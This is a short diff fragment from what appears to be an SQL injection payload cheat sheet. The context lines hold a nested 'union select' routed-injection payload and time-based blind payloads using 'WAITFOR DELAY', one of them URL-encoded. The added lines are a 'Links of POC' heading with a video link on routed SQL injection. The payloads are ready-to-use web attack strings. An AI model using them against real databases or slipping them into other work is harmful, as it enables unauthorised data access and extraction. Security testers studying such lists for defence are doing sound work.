@@ -269,3 +269,7 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
     ‘;%5waitfor%5delay%5’0:0:5′%5 — %5
     ‘ WAITFOR DELAY ‘0:0:5’ —
 ```
+### Links of POC
+```
+Routed Sql Injection >> https://youtu.be/mNj73yI8GEk?si=yuw2-_aGF0BjQuUk
+```
